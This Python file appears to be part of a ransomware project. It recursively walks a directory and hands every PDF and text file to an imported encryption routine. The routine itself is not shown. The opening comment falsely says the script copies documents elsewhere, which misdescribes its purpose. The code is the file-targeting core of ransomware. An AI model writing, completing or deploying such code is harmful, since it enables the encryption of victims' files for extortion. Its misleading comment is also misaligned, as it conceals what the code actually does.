# to copy all of my documents into another location.
from os.path import isdir,isfile,splitext
from os import listdir

import encrypt

encr=['pdf','txt']

def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
    for each in listdir(dirpath):
        if each[0]=='.':
            continue
        fpath=dirpath+'/'+each
        # print(fpath)
        if isdir(fpath):
            # print('isDir')
            try:
                movein(fpath)
            except OSError:
                continue
        elif isfile(fpath):
            # print('isFile')
            extension=splitext(fpath)[1][1:]
            print(extension)
            # print(extension)
            if extension in encr:
                # print(fpath)
                encrypt.encrypt(fpath)
                print('encrypted %s'%each)
        else:
            print('Cant tell type')
